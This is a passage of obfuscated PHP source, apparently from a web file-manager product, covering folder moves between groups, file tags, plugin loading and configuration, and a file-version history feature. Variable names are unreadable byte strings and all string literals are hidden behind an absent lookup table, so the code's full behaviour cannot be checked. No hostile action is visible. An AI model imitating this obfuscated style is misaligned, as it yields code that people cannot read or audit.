$åœ•ïÃ))); $¥Ğ¶ ¢ = Model($¹õÕ¼•[905])->where($‘ë Å­ó)->field($¹õÕ¼•[2084])->select(); $¥Ğ¶ ¢ = array_to_keyvalue($¥Ğ¶ ¢, $¹õÕ¼•[580], $¹õÕ¼•[193]); $¬±Ú‰‚‹ = !empty($¥Ğ¶ ¢[$‹¾ĞÅ¦Ù]) ? $¥Ğ¶ ¢[$‹¾ĞÅ¦Ù] : !1; if ($¬±Ú‰‚‹) { if (!$¥Ğ¶ ¢[$åœ•ïÃ]) { $¥Ğ¶ ¢[$åœ•ïÃ] = Model($¹õÕ¼•[905])->groupRootAdd($åœ•ïÃ); } $£ÒöŸâê = $¥Ğ¶ ¢[$åœ•ïÃ]; $‘ë Å­ó = array($¹õÕ¼•[192] => $¬±Ú‰‚‹); $¥Ğ¶ ¢ = Model($¹õÕ¼•[905])->where($‘ë Å­ó)->field($¹õÕ¼•[2085])->select(); if (!$¥Ğ¶ ¢) { $¥Ğ¶ ¢ = array(); } Model($¹õÕ¼•[905])->moveClearAuth = !1; foreach ($¥Ğ¶ ¢ as $½ˆ¼œÒ¿) { $¥„–Ÿè£ = $½ˆ¼œÒ¿[$¹õÕ¼•[496]] == $¹õÕ¼•[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¹õÕ¼•[905])->move($½ˆ¼œÒ¿[$¹õÕ¼•[193]], $£ÒöŸâê, $¥„–Ÿè£); } Model($¹õÕ¼•[905])->moveClearAuth = !0; $‘ë Å­ó = array($¹õÕ¼•[190] => 2, $¹õÕ¼•[580] => $‹¾ĞÅ¦Ù); $“ËÔĞ¸ = array($¹õÕ¼•[580] => $åœ•ïÃ); Model($¹õÕ¼•[2086])->where($‘ë Å­ó)->save($“ËÔĞ¸); Model($¹õÕ¼•[2087])->where($‘ë Å­ó)->save($“ËÔĞ¸); } $this->_changeChildLevel($ÖÏ“ñºó[$‹¾ĞÅ¦Ù], $ÖÏ“ñºó[$åœ•ïÃ], !0); $this->where(array($¹õÕ¼•[192] => $‹¾ĞÅ¦Ù))->save(array($¹õÕ¼•[192] => $åœ•ïÃ)); $this->_clearChildrenCache($ÖÏ“ñºó[$åœ•ïÃ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($ÃáıÇèò) { $†æŞ×´ =& $_SERVER[±³—úê]; return array($†æŞ×´[2088] => array($ÃáıÇèò[0], $†æŞ×´[2089]), $†æŞ×´[2090] => array($ÃáıÇèò[0], $†æŞ×´[2091])); } protected function get($õ¦èöù„) { $‘”æ†“ =& $_SERVER[±³—úê]; $¾à“÷şÕ = Model($‘”æ†“[596])->metaGet($õ¦èöù„, $‘”æ†“[2092]); $ŒŠí«Ò = json_decode($¾à“÷şÕ, !0); return $ŒŠí«Ò ? $ŒŠí«Ò : array($‘”æ†“[2093] => $‘”æ†“[91], $‘”æ†“[456] => array()); } protected function set($ËŠ™ĞÜë, $±ı€ÎÇ·) { $Û½âãù§ =& $_SERVER[±³—úê]; $±ı€ÎÇ· = $±ı€ÎÇ· ? $±ı€ÎÇ· : array($Û½âãù§[2093] => $Û½âãù§[91], $Û½âãù§[456] => array()); return Model($Û½âãù§[596])->metaSet($ËŠ™ĞÜë, $Û½âãù§[2092], json_encode($±ı€ÎÇ·)); } protected function getByTagID($Ù«ìøÈ, $âœ‚¨§­) { $Š–îôù¤ =& $_SERVER[±³—úê]; if (!$Ù«ìøÈ || !$âœ‚¨§­) { return !1; } if (!Model($Š–îôù¤[596])->getInfoSimple($Ù«ìøÈ)) { return !1; } $øıÚ•õ„ = $this->get($Ù«ìøÈ); if (!$øıÚ•õ„ || !isset($øıÚ•õ„[$Š–îôù¤[456]])) { return !1; } $Äí¤ñ‰ê = array_find_by_field($øıÚ•õ„[$Š–îôù¤[456]], $Š–îôù¤[486], $âœ‚¨§­); return is_array($Äí¤ñ‰ê) ? $Äí¤ñ‰ê : !1; } public function listSource($‡¹è†ğ±, $ ºÄŞˆ“) { $İ¥½ãâÚ =& $_SERVER[±³—úê]; if ($ ºÄŞˆ“ && !is_array($ ºÄŞˆ“)) { $ ºÄŞˆ“ = array($ ºÄŞˆ“); } $‹ã·´œ€ = $this->listData($‡¹è†ğ±); $ÓñØ¹¾Ñ = array(); foreach ($‹ã·´œ€ as $…ÀÂ‡¾ç) { $¢£ŒÏâ = $…ÀÂ‡¾ç[$İ¥½ãâÚ[87]]; if (!$¢£ŒÏâ) { continue; } if (!isset($ÓñØ¹¾Ñ[$¢£ŒÏâ])) { $ÓñØ¹¾Ñ[$¢£ŒÏâ] = array(); } $ÓñØ¹¾Ñ[$¢£ŒÏâ][] = $…ÀÂ‡¾ç[$İ¥½ãâÚ[511]]; } $—Øöï¼ = array(); foreach ($ÓñØ¹¾Ñ as $ê¶ñ“ => $Ÿ¡ˆ¼Ä™) { $„Ëî¢¿È = !0; if (!$ ºÄŞˆ“) { $—Øöï¼[] = $ê¶ñ“; continue; } foreach ($ ºÄŞˆ“ as $äùğÎĞ) { if (!in_array($äùğÎĞ, $Ÿ¡ˆ¼Ä™)) { $„Ëî¢¿È = !1; break; } } if ($„Ëî¢¿È) { $—Øöï¼[] = $ê¶ñ“; } } if (!$—Øöï¼) { return array(); } $ÉÑÎñú³ = array($İ¥½ãâÚ[502] => array($İ¥½ãâÚ[503], $—Øöï¼), $İ¥½ãâÚ[580] => $‡¹è†ğ±, $İ¥½ãâÚ[190] => SourceModel::TYPE_GROUP); $°Òüóœ = Model($İ¥½ãâÚ[1423])->listSource($ÉÑÎñú³); if (!$°Òüóœ || count($—Øöï¼) == $°Òüóœ[$İ¥½ãâÚ[453]][$İ¥½ãâÚ[454]]) { return $°Òüóœ; } $×åµ… å = array(); $‚Àü‹áç = array_to_keyvalue($°Òüóœ[$İ¥½ãâÚ[85]], $İ¥½ãâÚ[12], $İ¥½ãâÚ[193]); $©¦“’š¥ = array_to_keyvalue($°Òüóœ[$İ¥½ãâÚ[86]], $İ¥½ãâÚ[12], $İ¥½ãâÚ[193]); $‹èŠ£¢´ = array_merge($©¦“’š¥, $‚Àü‹áç); foreach ($—Øöï¼ as $¢£ŒÏâ) { if (!in_array($¢£ŒÏâ, $‹èŠ£¢´)) { $×åµ… å[] = $¢£ŒÏâ; } } if ($×åµ… å) { $this->removeBySource($‡¹è†ğ±, $×åµ… å); } return $°Òüóœ; } protected function listData($Ş¥´øÛÄ) { $‘ÃÃ¥ö =& $_SERVER[±³—úê]; $¬é£‹˜Ó = array($‘ÃÃ¥ö[1766] => 0, $‘ÃÃ¥ö[568] => array($‘ÃÃ¥ö[2094], 0), $‘ÃÃ¥ö[507] => $‘ÃÃ¥ö[2095] . $Ş¥´øÛÄ); $€Éí£¿Ñ = $‘ÃÃ¥ö[2096]; $××«êêÈ = $this->field($€Éí£¿Ñ)->where($¬é£‹˜Ó)->order($‘ÃÃ¥ö[2097])->select(); return $××«êêÈ ? $××«êêÈ : array(); } protected function addToTag($ß”½’ÕÂ, $¶©àŠÌ, $±ë…˜¸) { $íŞñÔş± =& $_SERVER[±³—úê]; if (!$this->getByTagID($ß”½’ÕÂ, $±ë…˜¸) || !$¶©àŠÌ) { return !1; } if (!Model($íŞñÔş±[905])->pathInfo($¶©àŠÌ)) { return !1; } $¿©ŠÈáÌ = array($íŞñÔş±[1766] => 0, $íŞñÔş±[568] => $±ë…˜¸, $íŞñÔş±[506] => $¶©àŠÌ, $íŞñÔş±[507] => $íŞñÔş±[2098] . $ß”½’ÕÂ, $íŞñÔş±[505] => $íŞñÔş±[12], $íŞñÔş±[1979] => 0); if ($this->where($¿©ŠÈáÌ)->find()) { return !1; } return $this->add($¿©ŠÈáÌ); } protected function removeFromTag($¡‡’ıİÀ, $Û©ê„Ù¥, $ÛÛş‘»ß) { $ÃÄ–ş‰ =& $_SERVER[±³—úê]; if (!$this->getByTagID($¡‡’ıİÀ, $ÛÛş‘»ß) || !$Û©ê„Ù¥) { return !1; } if (is_array($Û©ê„Ù¥)) { $Û©ê„Ù¥ = array($ÃÄ–ş‰[7], $Û©ê„Ù¥); } $Ã‹¾ı× = array($ÃÄ–ş‰[1766] => 0, $ÃÄ–ş‰[568] => $ÛÛş‘»ß, $ÃÄ–ş‰[507] => $ÃÄ–ş‰[2098] . $¡‡’ıİÀ, $ÃÄ–ş‰[506] => $Û©ê„Ù¥); return $this->where($Ã‹¾ı×)->delete(); } protected function removeByTag($“–ÅÍ“, $†  ƒ›š) { $§éŸÏØÁ =& $_SERVER[±³—úê]; if (!$this->getByTagID($“–ÅÍ“, $†  ƒ›š)) { return !1; } $Á²™§óÑ = array($§éŸÏØÁ[1766] => 0, $§éŸÏØÁ[568] => $†  ƒ›š, $§éŸÏØÁ[507] => $§éŸÏØÁ[2098] . $“–ÅÍ“); return $this->where($Á²™§óÑ)->delete(); } protected function removeBySource($ìÏš¹š¨, $‚¨Âùæ…) { $«Ì‰ÎÈİ =& $_SERVER[±³—úê]; if (!$ìÏš¹š¨ || !$‚¨Âùæ…) { return !1; } if (is_array($‚¨Âùæ…)) { $‚¨Âùæ… = array($«Ì‰ÎÈİ[7], $‚¨Âùæ…); } $âé¾Ïş = array($«Ì‰ÎÈİ[1766] => 0, $«Ì‰ÎÈİ[506] => $‚¨Âùæ…, $«Ì‰ÎÈİ[568] => array($«Ì‰ÎÈİ[1093], 0), $«Ì‰ÎÈİ[507] => $«Ì‰ÎÈİ[2098] . $ìÏš¹š¨); return $this->where($âé¾Ïş)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\160\x6c\x75\147\x69\x6e\x4c\151\163\164"; public $field = array("\156\141\x6d\x65", "\x73\x74\141\x74\165\163", "\162\x65\x67\x69\145\163\164", "\143\157\156\x66\151\147"); public function loadList($ñ™Û¥Õï = false) { $û¾—ıú« = array_to_keyvalue($this->listData(), $_SERVER[±³—úê][32]); if ($ñ™Û¥Õï) { return $û¾—ıú«[$ñ™Û¥Õï]; } return $û¾—ıú«; } public function init() { $ ˆÃºÈ¼ =& $_SERVER[±³—úê]; Hook::trigger($ ˆÃºÈ¼[2099]); $ÅêÕíŸœ = $this->loadPluginList(); foreach ($ÅêÕíŸœ as $îÙ¯Ê¸Ë => $Áí¡‰ù) { $à…Âµ±¡ = $this->appAllow($îÙ¯Ê¸Ë, $Áí¡‰ù); if (!$à…Âµ±¡) { continue; } foreach ($Áí¡‰ù[$ ˆÃºÈ¼[2100]] as $ÎÒ…¹€Ñ => $˜Ùêå÷‰) { Hook::bind($ÎÒ…¹€Ñ, $˜Ùêå÷‰); } } Hook::trigger($ ˆÃºÈ¼[2101]); Hook::trigger(ACTION); } public function appAllow($ó”¦ùÙª, $İÍöÈµ£, $´õÓ£ë· = true) { $ƒ¦Èè =& $_SERVER[±³—úê]; $ƒÍ“É˜ = PLUGIN_DIR . $ó”¦ùÙª . $ƒ¦Èè[2102]; if (!is_array($İÍöÈµ£) || !is_array($İÍöÈµ£[$ƒ¦Èè[2100]]) || $İÍöÈµ£[$ƒ¦Èè[830]] != 1 || !is_file($ƒÍ“É˜)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ƒ¦Èè[6]][$ƒ¦Èè[2103]] || !$GLOBALS[$ƒ¦Èè[6]][$ƒ¦Èè[2104]]) { return !0; } $³ééÔÛÍ = explode($ƒ¦Èè[50], strtolower($GLOBALS[$ƒ¦Èè[6]][$ƒ¦Èè[2104]])); return in_array(strtolower($ó”¦ùÙª), $³ééÔÛÍ) ? !1 : !0; } if ($´õÓ£ë· && !Action($ƒ¦Èè[2105])->checkAuth($ó”¦ùÙª)) { return !1; } return !0; } public function unInstall($‡Ãê­÷) { $‹›à†± =& $_SERVER[±³—úê]; $äÚ¢”‹€ = $this->loadList($‡Ãê­÷); if (file_exists(PLUGIN_DIR . $‡Ãê­÷)) { Hook::apply($‡Ãê­÷ . $‹›à†±[2106]); } $this->remove($äÚ¢”‹€[$‹›à†±[486]]); } public function changeStatus($õ±ŞíöÔ, $ç¬”‹£é) { $Ü¬¬ûÎ =& $_SERVER[±³—úê]; $¬È“Ã¨ = $this->loadList($õ±ŞíöÔ); if ($ç¬”‹£é) { Hook::apply($õ±ŞíöÔ . $Ü¬¬ûÎ[2107]); } $this->update($¬È“Ã¨[$Ü¬¬ûÎ[486]], array($Ü¬¬ûÎ[2108] => $ç¬”‹£é)); } public function appRegist($ğÖè£Ã¦, $ÕÃ¥ú’°) { $¸¨İşî =& $_SERVER[±³—úê]; $¬„çÊ¾ª = $this->loadList($ğÖè£Ã¦); if ($¬„çÊ¾ª) { $this->update($¬„çÊ¾ª[$¸¨İşî[486]], array($¸¨İşî[2100] => $ÕÃ¥ú’°)); } else { $ãĞıĞ¥ï = array($¸¨İşî[32] => $ğÖè£Ã¦, $¸¨İşî[2100] => $ÕÃ¥ú’°, $¸¨İşî[830] => 0, $¸¨İşî[6] => $this->getConfigDefault($ğÖè£Ã¦)); $this->insert($ãĞıĞ¥ï); } } public function getConfigDefault($§Á„½ÌÙ) { $ö™»ŞÅ¾ =& $_SERVER[±³—úê]; $ëıßš¥ß = array(); $¾ş»ÃÏ© = $this->getPackageJson($§Á„½ÌÙ); if (!$¾ş»ÃÏ© && is_array($¾ş»ÃÏ©[$ö™»ŞÅ¾[2109]])) { return $ëıßš¥ß; } foreach ($¾ş»ÃÏ©[$ö™»ŞÅ¾[2109]] as $ç÷ÍœÔÇ => $ŠÍÄù­Ñ) { if (!isset($ŠÍÄù­Ñ[$ö™»ŞÅ¾[461]]) || isset($ëıßš¥ß[$ç÷ÍœÔÇ])) { continue; } $ëıßš¥ß[$ç÷ÍœÔÇ] = $ŠÍÄù­Ñ[$ö™»ŞÅ¾[461]]; } return $ëıßš¥ß; } public function getPackageJson($¶Âá‘€”) { return Hook::apply($¶Âá‘€” . $_SERVER[±³—úê][2110]); } public function getConfig($´© ¡Ù‡, $„‘¿¡Š· = false) { $½ğ¸øÓ± =& $_SERVER[±³—úê]; $Ù€îÊÍø = array(); $ãÄ‰» = $this->loadList($´© ¡Ù‡); if ($ãÄ‰» && is_array($ãÄ‰»[$½ğ¸øÓ±[6]])) { $Ù€îÊÍø = $ãÄ‰»[$½ğ¸øÓ±[6]]; } if (!$Ù€îÊÍø || $„‘¿¡Š·) { $Ù€îÊÍø = $this->getConfigDefault($´© ¡Ù‡); } return $Ù€îÊÍø; } public function setConfig($íÛÖ™, $ãÉ§¶µÂ = false) { $Ÿ¤ÔôÎ¬ =& $_SERVER[±³—úê]; $ß®³ºİ = $this->loadList($íÛÖ™); if (!$ß®³ºİ) { return !1; } $È¬áèá = $ß®³ºİ[$Ÿ¤ÔôÎ¬[6]]; if ($ãÉ§¶µÂ == !1) { $È¬áèá = array(); $ãÉ§¶µÂ = $this->getConfigDefault($íÛÖ™); } foreach ($ãÉ§¶µÂ as $ë„’×À÷ => $ÚÙÓÁ™¡) { $È¬áèá[$ë„’×À÷] = is_string($ÚÙÓÁ™¡) ? trim($ÚÙÓÁ™¡) : $ÚÙÓÁ™¡; } $this->update($ß®³ºİ[$Ÿ¤ÔôÎ¬[486]], array($Ÿ¤ÔôÎ¬[6] => $È¬áèá)); } public function viewList() { $©àš…©ö =& $_SERVER[±³—úê]; $™‰Øà¼ = $this->loadList(); $this->pluginScan($™‰Øà¼); $™‰Øà¼ = $this->loadPluginList(); $ÛƒÄ¿Ä³ = array(); foreach ($™‰Øà¼ as $èÚêÙ±ú => $À´ŠÉË) { $¥ÇáÈ¸ò = $À´ŠÉË; unset($À´ŠÉË[$©àš…©ö[2100]], $À´ŠÉË[$©àš…©ö[6]]); $¦¦ƒı = PLUGIN_DIR . $À´ŠÉË[$©àš…©ö[32]] . $©àš…©ö[2102]; if (!is_file($¦¦ƒı)) { continue; } $ª•ÌĞ¡ş = Hook::apply($À´ŠÉË[$©àš…©ö[32]] . $©àš…©ö[2110]); if (!is_array($ª•ÌĞ¡ş)) { continue; } $ÛƒÄ¿Ä³[$èÚêÙ±ú] = array_merge($À´ŠÉË, $ª•ÌĞ¡ş); if ($¥ÇáÈ¸ò[$©àš…©ö[6]][$©àš…©ö[1686]] != $ª•ÌĞ¡ş[$©àš…©ö[1660]]) { Hook::apply($À´ŠÉË[$©àš…©ö[32]] . $©àš…©ö[2107]); $¥ÇáÈ¸ò[$©àš…©ö[6]][$©àš…©ö[1686]] = $ª•ÌĞ¡ş[$©àš…©ö[1660]]; $this->update($À´ŠÉË[$©àš…©ö[486]], array($©àš…©ö[6] => $¥ÇáÈ¸ò[$©àš…©ö[6]])); } } return $ÛƒÄ¿Ä³; } private function loadPluginList() { $äš†Ì‘¨ =& $_SERVER[±³—úê]; $ÔÑÇ¿‚Ğ = $this->loadList(); if (strtolower(MOD) == $äš†Ì‘¨[2111]) { return $ÔÑÇ¿‚Ğ; } $şù÷ÅÒŠ = Hook::trigger($äš†Ì‘¨[2112], $ÔÑÇ¿‚Ğ); if ($ÔÑÇ¿‚Ğ && !$şù÷ÅÒŠ) { die; } return $şù÷ÅÒŠ ? $şù÷ÅÒŠ : $ÔÑÇ¿‚Ğ; } private function pluginScan($‰æùÉÁë) { $±†«Ëúü =& $_SERVER[±³—úê]; recursion_dir(PLUGIN_DIR, $£—Œı¯©, $à¿¿É, 0); foreach ($£—Œı¯© as $Şæ¼¬§±) { $¦®¬Óš = get_path_this($Şæ¼¬§±); if (isset($‰æùÉÁë[$¦®¬Óš]) || !file_exists($Şæ¼¬§± . $±†«Ëúü[2113]) || !file_exists($Şæ¼¬§± . $±†«Ëúü[2102])) { continue; } Hook::apply($¦®¬Óš . $±†«Ëúü[2107]); } } } goto E™§å‚ö†ë; eä¬ìëĞŒÚ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $É¡·£úÓ =& $_SERVER[±³—úê]; $÷ÍË£ï¸ = $GLOBALS[$É¡·£úÓ[6]][$É¡·£úÓ[92]]; if ($÷ÍË£ï¸[$É¡·£úÓ[1303]] != 1) { return; } if ($÷ÍË£ï¸[$É¡·£úÓ[1304]] <= 0) { return; } if (isset($_REQUEST[$É¡·£úÓ[1305]]) && $_REQUEST[$É¡·£úÓ[1305]] == $É¡·£úÓ[91]) { return; } Hook::bind($É¡·£úÓ[1306], $É¡·£úÓ[1307]); Hook::bind($É¡·£úÓ[1308], $É¡·£úÓ[1309]); Hook::bind($É¡·£úÓ[1310], $É¡·£úÓ[1311]); Hook::bind($É¡·£úÓ[1312], $É¡·£úÓ[1313]); Hook::bind($É¡·£úÓ[1314], $É¡·£úÓ[1315]); Hook::bind($É¡·£úÓ[1316], $É¡·£úÓ[1317]); } public static function eventBeforeUpload($Ö…¢‚œ) { if ($Ö…¢‚œ[3] && $Ö…¢‚œ[3] != REPEAT_REPLACE) { return; } $°”È€Í° = self::parsePath($Ö…¢‚œ[0]); if (!$°”È€Í°) { return; } self::add($°”È€Í°); } public static function eventBeforeEdit($Ğ’Üö»ú) { $¸ŞŠå”Í = self::parsePath($Ğ’Üö»ú[0]); if (!$¸ŞŠå”Í) { return; } self::add($¸ŞŠå”Í); } public static function eventBeforeCopyFile($½’Ñ¾¶¶, $¥§ÆÂ…, $ëÅ¬ñì, $ŠÊ›Û–Ç, $Û¶ı°Ç, $äµö…°) { $×µáƒ¦‘ =& $_SERVER[±³—úê]; if (isset($ëÅ¬ñì->_data[$×µáƒ¦‘[1238]]) && $ëÅ¬ñì->_data[$×µáƒ¦‘[1238]]) { return; } $Ó¸‰å±ï = $ëÅ¬ñì->getPathOuter($ŠÊ›Û–Ç); $²ä—Åñ = self::parsePath($Ó¸‰å±ï); if (!$²ä—Åñ) { return; } self::add($²ä—Åñ); } public static function eventBeforeRename($•€Í¤²§) { $°Ã›ğç =& $_SERVER[±³—úê]; $Äº‹â¡İ = self::parsePath($•€Í¤²§[0]); if (!$Äº‹â¡İ) { return; } $©¾ÜşÓ = self::checkInHistory($Äº‹â¡İ); if (!$©¾ÜşÓ) { return; } if ($©¾ÜşÓ[$°Ã›ğç[33]] == $°Ã›ğç[242]) { $ÎğÉ •’ = self::listData($Äº‹â¡İ); if ($ÎğÉ •’ && $ÎğÉ •’[$°Ã›ğç[456]]) { self::moveHistory($Äº‹â¡İ, $•€Í¤²§[1]); } } else { IO::rename($©¾ÜşÓ[$°Ã›ğç[87]], $•€Í¤²§[1]); } } public static function eventBeforeMove($’¬…ë„›) { $ëÄ÷ª† =& $_SERVER[±³—úê]; $”Ÿõ÷ ã = self::parsePath($’¬…ë„›[0]); if (!$”Ÿõ÷ ã) { return; } $§Í£î¸­ = self::parsePath($’¬…ë„›[1]); if (!$§Í£î¸­) { return; } $ÀûØè ï = $’¬…ë„›[3]; $ºş›»Ñ¯ = self::checkInHistory($”Ÿõ÷ ã); if (!$ºş›»Ñ¯) { return; } $ÍáóÆÆÈ = self::pathHistory($§Í£î¸­); if ($ºş›»Ñ¯[$ëÄ÷ª†[33]] == $ëÄ÷ª†[242]) { $·©Ú¤Ó = self::listData($”Ÿõ÷ ã); $õË¤¨ùò = rtrim($§Í£î¸­, $ëÄ÷ª†[8]) . $ëÄ÷ª†[8] . ($ÀûØè ï ? $ÀûØè ï : get_path_this($”Ÿõ÷ ã)); $Îæ±»‡ï = self::listData($õË¤¨ùò); if ($·©Ú¤Ó && $·©Ú¤Ó[$ëÄ÷ª†[456]] && $Îæ±»‡ï && $Îæ±»‡ï[$ëÄ÷ª†[456]]) { return self::clear($”Ÿõ÷ ã); } if ($·©Ú¤Ó && $·©Ú¤Ó[$ëÄ÷ª†[456]]) { self::moveHistory($”Ÿõ÷ ã, $ÀûØè ï, $ÍáóÆÆÈ); } } else { IO::move($ºş›»Ñ¯[$ëÄ÷ª†[87]], $ÍáóÆÆÈ, !1, $ÀûØè ï); self::clearEmptyFolder(IO::pathFather($ºş›»Ñ¯[$ëÄ÷ª†[87]])); } } public static function eventAfterRemove($¦¯â…ĞÖ, $Å®¤õóË) { $ğ¡í÷‰ =& $_SERVER[±³—úê]; if (!$Å®¤õóË) { return; } $ñğóŒÆà = self::parsePath($¦¯â…ĞÖ[0]); if (!$ñğóŒÆà) { return; } $§ÊˆŠã = self::checkInHistory($ñğóŒÆà); if (!$§ÊˆŠã) { return; } if ($§ÊˆŠã[$ğ¡í÷‰[33]] == $ğ¡í÷‰[242]) { $…ºÕ–õü = self::listData($ñğóŒÆà, !1); if ($…ºÕ–õü && $…ºÕ–õü[$ğ¡í÷‰[456]]) { self::clear($ñğóŒÆà, !1); } } else { IO::remove($§ÊˆŠã[$ğ¡í÷‰[87]]); self::clearEmptyFolder(IO::pathFather($§ÊˆŠã[$ğ¡í÷‰[87]])); } } private static function checkInHistory($§º…ÆÁî) { $Íêß¡Ñˆ = self::pathHistory($§º…ÆÁî); if (!IO::exist($Íêß¡Ñˆ)) { $Íêß¡Ñˆ .= $_SERVER[±³—úê][1318]; } return IO::exist($Íêß¡Ñˆ) ? IO::info($Íêß¡Ñˆ) : !1; } private static function parsePath($¼ªÃÎ‡ë) { $±ß”‘Éí =& $_SERVER[±³—úê]; if (!$¼ªÃÎ‡ë) { return !1; } if (isset($GLOBALS[$±ß”‘Éí[1319]]) && $GLOBALS[$±ß”‘Éí[1319]]) { return; } $îÈ‚Ö = KodIO::parse($¼ªÃÎ‡ë); $ÎíğÜ¤ª = $îÈ‚Ö[$±ß”‘Éí[33]]; $äˆ½¿º£ = !$ÎíğÜ¤ª || $ÎíğÜ¤ª == KodIO::KOD_IO || $ÎíğÜ¤ª == KodIO::KOD_SHARE_ITEM; if (!$äˆ½¿º£ || !$îÈ‚Ö[$±ß”‘Éí[1320]]) { return !1; } if (substr($¼ªÃÎ‡ë, 0, strlen(DATA_PATH . $±ß”‘Éí[1321])) == DATA_PATH . $±ß”‘Éí[1321]) { return !1; } if ($ÎíğÜ¤ª == KodIO::KOD_SHARE_ITEM) { $›“¤¥¯Ğ = IO::init($¼ªÃÎ‡ë); if ($›“¤¥¯Ğ->pathParse[$±ß”‘Éí[1234]]) { return self::parsePath($›“¤¥¯Ğ->pathParse[$±ß”‘Éí[1234]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $’¯«šÕ† = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $±ß”‘Éí[1322]); foreach ($’¯«šÕ† as $ÂªØ·È¸) { if (!$ÎíğÜ¤ª && substr($¼ªÃÎ‡ë, 0, strlen($ÂªØ·È¸)) == $ÂªØ·È¸) { return !1; } } self::log($GLOBALS[$±ß”‘Éí[1229]] . $±ß”‘Éí[1323] . $¼ªÃÎ‡ë); return $¼ªÃÎ‡ë; } private static function pathHistory($ç¾ØØÔ“) { $ÃÚ”Äè =& $_SERVER[±³—úê]; $ÎñĞ®¨Ñ = self::$_historyBase . ltrim(KodIO::clear($ç¾ØØÔ“), $ÃÚ”Äè[8]); $ÎñĞ®¨Ñ = str_replace(array($ÃÚ”Äè[1324]), array($ÃÚ”Äè[1325]), $ÎñĞ®¨Ñ); return $ÎñĞ®¨Ñ; } public static function log($Õ¥ÉèáŸ) { } public static function historyCount($Ç÷î˜›®) { $Ú¿’ËÈ =& $_SERVER[±³—úê]; $¥ÑâßöÄ = array(); $Ÿ©×¢‚Ç = array(); foreach ($Ç÷î˜›® as $İ¨‡è‚) { $Ú®èÙÔ¦ = get_path_father($İ¨‡è‚); if (!$Ÿ©×¢‚Ç[$Ú®èÙÔ¦]) { $Ÿ©×¢‚Ç[$Ú®èÙÔ¦] = array(); } $Ÿ©×¢‚Ç[$Ú®èÙÔ¦][] = get_path_this($İ¨‡è‚); } foreach ($Ÿ©×¢‚Ç as $Ú®èÙÔ¦ => $ÛØñ´µ‰) { $¿™¶‡ç½ = self::parsePath($Ú®èÙÔ¦); if (!$¿™¶‡ç½) { continue; } foreach ($ÛØñ´µ‰ as $ˆ·åÎç) { $ß¹İë•æ = self::listData(rtrim($¿™¶‡ç½, $Ú¿’ËÈ[8]) . $Ú¿’ËÈ[8] . $ˆ·åÎç, !1); if ($ß¹İë•æ && $ß¹İë•æ[$Ú¿’ËÈ[456]]) { $¥ÑâßöÄ[rtrim($Ú®èÙÔ¦, $Ú¿’ËÈ[8]) . $Ú¿’ËÈ[8] . $ˆ·åÎç] = count($ß¹İë•æ[$Ú¿’ËÈ[456]]); } } } return $¥ÑâßöÄ; } public static function add($¸‰Ğü) { $ÙÁİï—Ş =& $_SERVER[±³—úê]; $´É«ÎÔ = self::listData($¸‰Ğü); if (!$´É«ÎÔ) { return; } $¼‚Ö» = Model($ÙÁİï—Ş[850])->get($ÙÁİï—Ş[1326]); $œ˜ıÖ¢ = intval($GLOBALS[$ÙÁİï—Ş[6]][$ÙÁİï—Ş[92]][$ÙÁİï—Ş[1304]]); $’êÍÉ‰Ø = $¼‚Ö» == $ÙÁİï—Ş[1327] ? min(5, $œ˜ıÖ¢) : $œ˜ıÖ¢; if ($œ˜ıÖ¢ <= 0) { return; } $¯ß¬Åú = IO::info($¸‰Ğü); $­ÂƒÁÏ = $´É«ÎÔ[$ÙÁİï—Ş[456]]; if ($¯ß¬Åú[$ÙÁİï—Ş[79]] == 0) { return; } if ($¯ß¬Åú[$ÙÁİï—Ş[79]] >= 1024 * 1024 * 500) { return !1; } $ä©É–ËÍ = IO::hashSimple($¸‰Ğü); if ($­ÂƒÁÏ && $­ÂƒÁÏ[0][$ÙÁİï—Ş[686]] == $ä©É–ËÍ) { return !0; } if (array_key_exists($ÙÁİï—Ş[245], $¯ß¬Åú) && !$¯ß¬Åú[$ÙÁİï—Ş[245]]) { return !1; } $ìÌêâû‹ = short_id(time()); $“¾šçĞÇ = array($ÙÁİï—Ş[486] => $ìÌêâû‹, $ÙÁİï—Ş[686] => $ä©É–ËÍ, $ÙÁİï—Ş[32] => $¯ß¬Åú[$ÙÁİï—Ş[32]] . $ÙÁİï—Ş[10] . date($ÙÁİï—Ş[1328]) . rand_string(1), $ÙÁİï—Ş[79] => $¯ß¬Åú[$ÙÁİï—Ş[79]], $ÙÁİï—Ş[538] => USER_ID, $ÙÁİï—Ş[243] => time(), $ÙÁİï—Ş[1329] => $ÙÁİï—Ş[12]); IO::mkdir($´É«ÎÔ[$ÙÁİï—Ş[1330]]); $¨›ÌÄ¦¬ = IO::copy($¸‰Ğü, $´É«ÎÔ[$ÙÁİï—Ş[1330]], !1, $“¾šçĞÇ[$ÙÁİï—Ş[32]]); if (!$¨›ÌÄ¦¬) { self::clearEmptyFolder($´É«ÎÔ[$ÙÁİï—Ş[1330]]); return !1; } array_unshift($­ÂƒÁÏ, $“¾šçĞÇ); if (count($­ÂƒÁÏ) > $’êÍÉ‰Ø) { $ÇìäÜ˜Õ = array_slice($­ÂƒÁÏ, $’êÍÉ‰Ø); foreach ($ÇìäÜ˜Õ as $—„Ï°ÚÕ) { IO::remove($´É«ÎÔ[$ÙÁİï—Ş[1330]] . $—„Ï°ÚÕ[$ÙÁİï—Ş[32]]); } $­ÂƒÁÏ = array_slice($­ÂƒÁÏ, 0, $’êÍÉ‰Ø); } return self::saveData($´É«ÎÔ[$ÙÁİï—Ş[1331]], $­ÂƒÁÏ); } public static function remove($Ç¸Éì‡³, $Ò¾°èÙø) { $¡ŸÂ¤Ë =& $_SERVER[±³—úê]; $ÆÄÄ‚²š = self::listData($Ç¸Éì‡³); $¨µªù¥ = array(); if (!$ÆÄÄ‚²š) { return !1; } foreach ($ÆÄÄ‚²š[$¡ŸÂ¤Ë[456]] as $³ğõ¼À·) { if ($³ğõ¼À·[$¡ŸÂ¤Ë[486]] == $Ò¾°èÙø) { IO::remove($ÆÄÄ‚²š[$¡ŸÂ¤Ë[1330]] . $³ğõ¼À·[$¡ŸÂ¤Ë[32]]); continue; } 